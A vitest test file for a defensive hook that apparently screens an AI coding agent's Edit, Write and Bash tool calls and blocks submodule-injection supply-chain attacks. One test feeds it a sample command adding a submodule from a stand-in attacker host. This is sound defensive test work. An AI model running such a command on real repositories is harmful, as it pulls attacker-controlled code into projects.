import { describe, it, expect } from 'vitest';
import guard from './index.js';

const bashCtx = (cmd: string) => ({
  tool: 'Bash',
  input: { command: cmd },
  env: {},
  paths: { home: '/h', ssh: '/h/.ssh', aws: '/h/.aws', tmp: '/tmp' },
  log: () => undefined,
  abort: new AbortController().signal,
});

const editCtx = (file_path: string, tool: 'Edit' | 'Write' = 'Edit') => ({
  tool,
  input: { file_path },
  env: {},
  paths: { home: '/h', ssh: '/h/.ssh', aws: '/h/.aws', tmp: '/tmp' },
  log: () => undefined,
  abort: new AbortController().signal,
});

describe('submodule-injection-guard', () => {
  it('manifest declares scalar block severity, T-018, multi-tool matchers', () => {
    expect(guard.manifest.severity).toBe('block');
    expect(guard.manifest.threat).toBe('T-018-supply-chain-submodule');
    expect(guard.manifest.event).toBe('PreToolUse');
    expect(guard.manifest.matchers).toEqual(['Edit', 'Write', 'Bash']);
    expect(guard.manifest.profiles).toEqual(['baseline', 'strict', 'regulated']);
    expect(guard.manifest.timeout_ms).toBe(1500);
  });

  it('blocks Edit on .gitmodules', async () => {
    const r = await guard.run(editCtx('.gitmodules', 'Edit'));
    expect(r.decision).toBe('block');
  });

  it('blocks Write on repo/.gitmodules', async () => {
    const r = await guard.run(editCtx('/path/to/repo/.gitmodules', 'Write'));
    expect(r.decision).toBe('block');
  });

  it('blocks git submodule add', async () => {
    const r = await guard.run(bashCtx('git submodule add https://attacker.example.com/evil sub/evil'));
    expect(r.decision).toBe('block');
  });

  it('blocks git submodule update --init', async () => {
    const r = await guard.run(bashCtx('git submodule update --init'));
    expect(r.decision).toBe('block');
  });

  it('allows Edit on a normal file', async () => {
    const r = await guard.run(editCtx('/path/to/repo/src/index.ts', 'Edit'));
    expect(r.decision).toBe('allow');
  });

  it('allows git submodule status', async () => {
    const r = await guard.run(bashCtx('git submodule status'));
    expect(r.decision).toBe('allow');
  });

  it('allows plain git status', async () => {
    const r = await guard.run(bashCtx('git status'));
    expect(r.decision).toBe('allow');
  });

  it('allows when bash command missing', async () => {
    const r = await guard.run({
      tool: 'Bash',
      input: {},
      env: {},
      paths: { home: '/h', ssh: '/h/.ssh', aws: '/h/.aws', tmp: '/tmp' },
      log: () => undefined,
      abort: new AbortController().signal,
    });
    expect(r.decision).toBe('allow');
  });
});
